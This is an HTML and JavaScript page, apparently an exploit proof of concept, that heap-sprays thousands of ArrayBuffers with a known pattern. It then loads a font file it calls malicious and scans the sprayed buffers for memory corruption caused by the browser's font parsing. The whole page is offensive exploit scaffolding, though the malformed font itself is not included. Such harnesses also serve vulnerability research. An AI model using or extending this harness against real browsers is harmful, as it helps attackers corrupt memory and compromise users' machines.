<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8" />
  <title>Heap Spray + Glyph Test</title>
  <style>
    body {
      background: #000;
      color: #0f0;
      font-family: monospace;
    }
    .log {
      white-space: pre-wrap;
      margin-top: 1em;
      background: #111;
      padding: 1em;
      border: 1px solid #0f0;
    }
  </style>
</head>
<body>
  <h1>Heap Spray + Glyph Test</h1>
  <div id="glyph">%</div>
  <button onclick="start()">Start</button>
  <div class="log" id="log">Waiting...</div>

  <script>
    const log = msg => {
      document.getElementById('log').innerText += msg + "\n";
    };

    let spray = [];

    function heap_spray() {
      log("[*] Heap spraying ArrayBuffer(0x1000) x 10000...");
      for (let i = 0; i < 10000; i++) {
        let ab = new ArrayBuffer(0x1000);
        let dv = new DataView(ab);
        // Initialize with known pattern
        for (let j = 0; j < 0x1000; j += 4) {
          dv.setUint32(j, 0xdeadbeef, true);  // Known value
        }
        spray.push(dv);
      }
      log("[+] Heap sprayed!");
    }

    async function start() {
      heap_spray();

      log("[*] Loading malicious font...");
      const font_face = new FontFace('foo', 'url("mal_modified.ttf")');

      try {
        await font_face.load();
        document.fonts.add(font_face);
        document.getElementById('glyph').style.fontFamily = 'foo';
        log("[+] Font loaded and applied.");
      } catch (err) {
        log("[-] Error loading font:", err);
        return;
      }

      log("[*] Scanning for corruption...");
      detect_corruption();
    }

    function detect_corruption() {
      for (let i = 0; i < spray.length; i++) {
        try {
          let val = spray[i].getUint32(0, true);
          if (val !== 0xdeadbeef) {
            log(`[!] Corruption detected at index ${i}: 0x${val.toString(16)}`);
          }
        } catch (e) {
          // Skip unreadable regions
        }
      }
      log("[*] Scan complete.");
    }
  </script>
</body>
</html>
